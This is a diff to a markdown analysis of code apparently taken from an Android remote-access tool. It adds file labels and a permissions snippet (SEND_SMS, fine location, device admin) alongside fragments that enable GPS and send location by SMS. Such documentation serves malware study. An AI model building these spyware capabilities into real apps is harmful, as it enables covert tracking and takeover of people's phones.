@@ -213,6 +213,7 @@ public class ConnectionManager {
     }
 ```
 ## Possible Device Admin Privileges
+- DeviceAdmin.java
 ```java
 package ahmyth.mine.king.ahmyth;
 
@@ -241,6 +242,7 @@ public class DeviceAdmin extends DeviceAdminReceiver {
 }
 ```
 ## Possible Automatic enabling of Device GPS (Device admin privileges required)
+- AdminLocationMamager.java
 ```java
     private void activateGps(Context context) {
 
@@ -281,4 +283,20 @@ public class DeviceAdmin extends DeviceAdminReceiver {
         locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationSender(number), null);
 
     }
+```
+- unknown.java
+```java
+        perms.put("allow_location", new String[]{
+
+                Manifest.permission.SEND_SMS,
+
+                Manifest.permission.ACCESS_FINE_LOCATION,
+
+        });
+
+        perms.put("allow_location_modechange", new String[]{
+
+                Manifest.permission.BIND_DEVICE_ADMIN,
+
+        });
 ```
